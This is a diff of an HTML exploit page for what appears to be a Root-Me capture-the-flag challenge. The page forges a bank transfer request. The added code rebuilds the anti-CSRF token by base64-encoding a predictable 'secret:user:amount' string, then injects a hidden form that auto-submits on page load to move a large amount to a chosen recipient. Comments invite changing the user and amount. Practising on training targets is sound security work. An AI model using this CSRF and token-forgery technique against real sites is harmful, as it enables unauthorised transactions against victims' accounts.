@@ -1,9 +1,23 @@
 <html>
   <body onload="document.forms[0].submit()">
-    <form action="https://bankme-2.challenges.pro.root-me.org/transfer" method="POST">
-      <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6dGhlX3p1Y2NjY2NjazoxMDAwMDAw" />
-      <input type="hidden" name="recipient" value="user" />
-      <input type="hidden" name="amount" value="1000000" />
-    </form>
+    <script>
+      function generateToken(user, amount) {
+        let rawToken = `CSRFs_4r3_c00l:${user}:${amount}`;
+        let encodedToken = btoa(rawToken); // Codifica en Base64
+        return encodedToken;
+      }
+
+      let user = "the_zucccccck"; // Cambia esto por el usuario deseado
+      let amount = "2513699514"; // Cambia esto por la cantidad deseada
+      let token = generateToken(user, amount);
+
+      document.write(`
+        <form action="https://bankme-2.challenges.pro.root-me.org/transfer" method="POST">
+          <input type="hidden" name="token" value="${token}" />
+          <input type="hidden" name="recipient" value="${user}" />
+          <input type="hidden" name="amount" value="${amount}" />
+        </form>
+      `);
+    </script>
   </body>
 </html>
